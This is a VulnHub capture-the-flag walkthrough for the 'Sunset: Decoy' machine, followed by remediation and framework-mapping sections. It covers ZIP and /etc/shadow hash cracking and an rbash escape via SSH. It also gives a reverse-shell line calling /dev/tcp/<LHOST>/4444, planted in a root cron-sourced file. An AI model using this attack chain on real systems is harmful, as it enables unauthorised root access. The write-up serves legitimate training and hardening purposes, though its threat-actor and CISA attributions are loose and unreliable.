# Sunset: Decoy — The Trap Is the ZIP, the Real Trap Is the Schedule

Dude, Sunset: Decoy is one of those boxes that teaches you to look beyond the obvious. The name says it all: there is a decoy, and the decoy is hiding the real attack surface. A ZIP archive on the web service contains an encrypted backup of system files including /etc/shadow. Crack the ZIP, crack the shadow hashes, SSH in with a restricted shell, escape the restriction, and then let pspy do the work of revealing a root-owned scheduled binary that sources a writable update file. Slept on? Yes. Legit clever? Absolutely. Props to whitecr0wz.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Sunset: Decoy |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/sunset-decoy,505/ |
| **Techniques** | Full port scan, web enumeration, ZIP hash extraction (zip2john), offline hash cracking (John the Ripper), /etc/shadow hash cracking, SSH restricted shell escape, process monitoring (pspy), scheduled task hijacking via writable update file, reverse shell as root |
| **CVEs** | EDB-33899 (referenced vulnerable utility); CWE-312 — Cleartext Storage of Sensitive Information; CWE-732 — Incorrect Permission Assignment; CWE-522 — Insufficiently Protected Credentials |
| **APT Groups** | FIN7: documented use of ZIP/archive credential theft and offline cracking in initial access operations; Lazarus Group: uses backup file credential extraction as a standard post-foothold technique on Linux targets |

---

## Attack Summary

```
nmap → SSH (22), HTTP (80)
  |
  +-> wget http://TARGET/save.zip
  |
  +-> zip2john save.zip → john → password: manual
  |
  +-> unzip save.zip → etc/shadow extracted
  |
  +-> john etc/shadow → user:password cracked
  |
  +-> ssh -t user@TARGET "bash --noprofile" (restricted shell bypass)
  |
  v
user shell (restricted shell escaped)
  |
  +-> ./honeypot.decoy → option 5
  |
  +-> pspy64 → root-owned binary executes every ~60s
  |          → sources ./update (user-writable)
  |
  +-> cat > update << 'EOF'
  |   bash -i >& /dev/tcp/LHOST/4444 0>&1
  |   EOF
  |
  v
root shell (reverse callback)
  |
  v
/root/root.txt
```

---

## Methodology

1. Full port scan: identify SSH and HTTP services
2. Web enumeration: find save.zip archive
3. ZIP password cracking: zip2john + John the Ripper
4. Shadow file hash cracking: extract and crack /etc/shadow hashes
5. SSH access: login as cracked user
6. Restricted shell escape: bypass via bash --noprofile flag
7. Process monitoring: pspy reveals root-scheduled binary sourcing ./update
8. Scheduled task hijacking: plant reverse shell in ./update, catch root callback

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r <subnet>/24
# Add target to /etc/hosts

nmap -sV -sC -p- <TARGET_IP>
```

Key findings: SSH on port 22, HTTP on port 80 (and possibly 443).

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and ZIP Discovery

```bash
# Browse the web service
curl http://<TARGET_IP>/
curl http://<TARGET_IP>/robots.txt

# Directory brute-force
gobuster dir \
  -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x zip,tar,bak,txt,html \
  -t 30
```

The key file is reachable at the root or in a predictable location:

```bash
wget http://<TARGET_IP>/save.zip
```

The archive is password-protected. This is the "decoy" surface.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — ZIP Password Cracking

Extract the ZIP hash and crack it with John:

```bash
zip2john save.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

Recovered password: **manual**

Unzip the archive:

```bash
unzip save.zip -d save_extracted/
# Password: manual
```

The archive extracts backup copies of system files, including `etc/shadow`.

**Real-world note:** Password-protected ZIP archives provide almost zero real security. zip2john + rockyou cracks the majority of real-world archive passwords in seconds. Organizations that use ZIP encryption to protect backups containing /etc/shadow are creating a false sense of security. FIN7 specifically targets web-accessible backup archives for credential extraction.

**MITRE ATT&CK:** T1552.001 — Unsecured Credentials: Credentials in Files

---

## Step 4 — Shadow File Hash Cracking

Extract usable hashes from the shadow file:

```bash
# Filter out locked accounts
grep -v '!!\|*' save_extracted/etc/shadow | grep ':\$' > users.hash

# Crack the hashes
john --wordlist=/usr/share/wordlists/rockyou.txt users.hash

# Show cracked credentials
john --show users.hash
```

Note the cracked username and password for SSH access.

**Alternative with hashcat (GPU):**

```bash
# Extract just the hash lines
cat save_extracted/etc/shadow | grep ':\$6\$' > sha512.hash
hashcat -m 1800 -d 1 -w 3 sha512.hash /usr/share/wordlists/rockyou.txt
```

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 5 — SSH Access and Restricted Shell Escape

The target user's login shell is restricted (rbash or similar):

```bash
# Standard SSH lands in restricted shell
ssh <user>@<TARGET_IP>
# Restricted shell: limited commands only
```

Bypass by forcing an unrestricted bash via SSH's command execution:

```bash
ssh -t <user>@<TARGET_IP> "bash --noprofile"
```

This bypasses the restricted shell entirely. You now have a standard bash session.

Read the user flag:

```bash
cat user.txt
```

**Real-world note:** Restricted shells (rbash, lshell, rzsh) are frequently used as a compensating control for accounts that need SSH access but should not have full shell capabilities. They are consistently bypassable via `bash --noprofile`, `ssh -t ... bash`, `vim :!/bin/bash`, or similar methods. Proper isolation requires chroot jails or containers, not restricted shells.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo (analogous shell restriction bypass)

---

## Step 6 — Process Monitoring with pspy

Transfer pspy64 to the target (or find it if pre-installed):

```bash
# On attacker
python3 -m http.server 8080

# On target
wget http://<LHOST>/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

Run the honeypot.decoy binary and select option 5 to trigger a scheduled process:

```bash
./honeypot.decoy
# Select: 5
```

Observe pspy output. Within ~60 seconds you should see a root-owned process executing a binary that sources `./update`.

**Real-world note:** pspy is indispensable for privilege escalation enumeration. It monitors process creation without requiring root access, revealing scheduled tasks that do not appear in crontab (they may be executed by other means: systemd timers, at jobs, init scripts). APT41 operators are documented to use process monitoring techniques to identify root-executed jobs.

**MITRE ATT&CK:** T1057 — Process Discovery; T1053.003 — Scheduled Task: Cron

---

## Step 7 — Scheduled Task Hijacking

The scheduled binary sources a file named `update` from the current directory (EDB-33899 pattern). Create a malicious update file:

```bash
# Start listener on attacker
nc -lvnp 4444

# On target: create the reverse shell payload
cat > update << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<LHOST>/4444 0>&1
EOF
chmod +x update
```

Wait up to 60 seconds for the scheduler to fire. The reverse shell callback arrives with root privileges.

```bash
# On the root shell
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. The decoy fooled no one. gg.

**Real-world note:** Scheduled jobs that source or execute files from user-accessible directories are a textbook privilege escalation vector. The pattern appears in enterprise environments when administrators create cron or systemd timer scripts that reference relative paths, allowing any user who can write to the working directory to hijack the execution flow.

**MITRE ATT&CK:** T1053.003 — Scheduled Task: Cron; T1574.009 — Hijack Execution Flow: Path Interception by Path Variable

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| ZIP archive | save.zip | HTTP web root | Contains /etc/shadow |
| ZIP password | manual | zip2john + John | Archive extraction |
| User credential | (cracked from shadow) | etc/shadow in ZIP | SSH access |
| User flag | user.txt | User home directory | User flag |
| Scheduled task | ./update (writable) | pspy + honeypot.decoy option 5 | Root shell vector |
| Root flag | /root/root.txt | Post-exploitation | Machine complete |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | /etc/shadow included in web-accessible backup | Backup archives containing system credential files are a direct path to full compromise | Never include shadow/passwd in backups; restrict backup access to authorized systems only |
| 2 | Password-protected ZIP provides minimal security | Rockyou + zip2john breaks most archive passwords in seconds | Use GPG or AES-256 encryption for sensitive archives; never rely on ZIP password protection |
| 3 | Restricted shell bypassed with bash --noprofile | Rbash and similar restricted shells are not security controls | Use chroot jails or containers for restricted access; restricted shells alone are insufficient |
| 4 | Scheduled root job sources user-writable file | Classic cron hijacking pattern; appears in real enterprise environments regularly | All files sourced by root-owned scripts must be owned by root and not world-writable |
| 5 | pspy reveals hidden scheduled tasks without root | Process monitoring is a fundamental privesc enumeration step | Monitor and audit all scheduled tasks; use systemd timer logs for visibility |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | Discovery | Process Discovery | T1057 |
| Discovery | Discovery | Scheduled Task: Cron | T1053.003 |
| Privilege Escalation | Privilege Escalation | Scheduled Task: Cron (hijack) | T1053.003 |
| Privilege Escalation | Privilege Escalation | Hijack Execution Flow: Path Interception | T1574.009 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove /etc/shadow from backup archives:** audits should verify no credential files are included in any backup
2. **Encrypt sensitive archives with GPG or AES-256:** ZIP password encryption is not a security control for sensitive data
3. **Use chroot or containers instead of restricted shells:** rbash is consistently bypassable
4. **Ensure all files sourced by root cron/timer jobs are root-owned and not world-writable:** `find / -writable -type f 2>/dev/null | grep -v proc`
5. **Patch or remove EDB-33899-vulnerable utility:** review all SUID and scheduled executables
6. **Disable SSH password authentication where possible:** key-only authentication reduces credential-based attacks

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (backup content controls; cron script ownership)
- **D3-OAM** — Operating System Administrative Management (scheduled task auditing; chroot enforcement)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credentials in deployed artifacts/backups)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all backup archives and their contents |
| Protect | Data Security | Remove credential files from backups; encrypt archives with strong algorithms |
| Protect | Access Control | Replace restricted shells with chroot; restrict cron source file ownership |
| Detect | Anomalies and Events | Monitor scheduled task execution; alert on unusual process spawning from cron |
| Respond | Response Planning | Remove malicious update file; disable compromised user account; rotate all credentials |
| Recover | Recovery Planning | Audit all backups for credential exposure; rebuild compromised host |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict backup file access; cron script file permissions |
| IA-5 | Authenticator Management | Remove /etc/shadow from backups; rotate all cracked credentials |
| CM-7 | Least Functionality | Disable public access to ZIP archives; replace restricted shell with chroot |
| AU-6 | Audit Review | Monitor scheduled task logs for unusual execution |
| SI-2 | Flaw Remediation | Patch EDB-33899 vulnerable utility; remove world-writable cron sources |
| SC-28 | Protection of Information at Rest | Encrypt backup archives with AES-256 or GPG |

### CISA KEV

The backup archive credential exposure pattern maps to CISA Alert AA22-074A (Threat Actors Exploiting Unpatched and Outdated Software). The scheduled task hijacking technique is referenced in CISA's "Top Routinely Exploited Vulnerabilities" guidance as a privilege escalation primitive. Organizations are advised to audit all backup processes and scheduled tasks per CISA hardening recommendations.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

Sunset: Decoy lives up to its name in the best possible way. The decoy is the ZIP. The real threat is the scheduled job. The lesson is about layered credential exposure: one web-accessible archive, one cracked password, one cracked shadow hash, one restricted shell bypass, and one writable update file. All misconfiguration. All avoidable. No exploits needed. fr fr this is real-world stuff.

Thanks guys!! (❍ᴥ❍ʋ)
